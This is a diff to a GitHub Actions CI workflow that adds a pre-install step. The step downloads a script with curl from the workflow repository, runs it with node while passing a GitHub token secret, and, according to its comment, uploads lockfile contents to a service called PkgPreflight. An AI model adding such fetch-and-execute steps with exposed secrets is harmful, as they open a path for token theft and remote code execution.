@@ -201,6 +201,19 @@ jobs:
             ${{ runner.os }}-yarn-v1-
 
       - if: ${{ needs.pre.outputs.should_skip != 'true' }}
+        name: Inspect dependency lockfile changes
+        run: |
+          # PkgPreflight is a WillBooster internal service; this uploads changed lockfile contents before install.
+          curl --fail --show-error --silent \
+            "https://raw.githubusercontent.com/${WORKFLOW_REPOSITORY}/${WORKFLOW_SHA}/.github/scripts/create-pkg-preflight-request.cjs" \
+            --output "$RUNNER_TEMP/create-pkg-preflight-request.cjs"
+          node "$RUNNER_TEMP/create-pkg-preflight-request.cjs"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
+          WORKFLOW_REPOSITORY: ${{ job.workflow_repository }}
+          WORKFLOW_SHA: ${{ job.workflow_sha }}
+
+      - if: ${{ needs.pre.outputs.should_skip != 'true' }}
         name: Install dependencies
         run: |
           if [[ "${{ steps.env-info.outputs.runner }}" == "bun" ]]; then
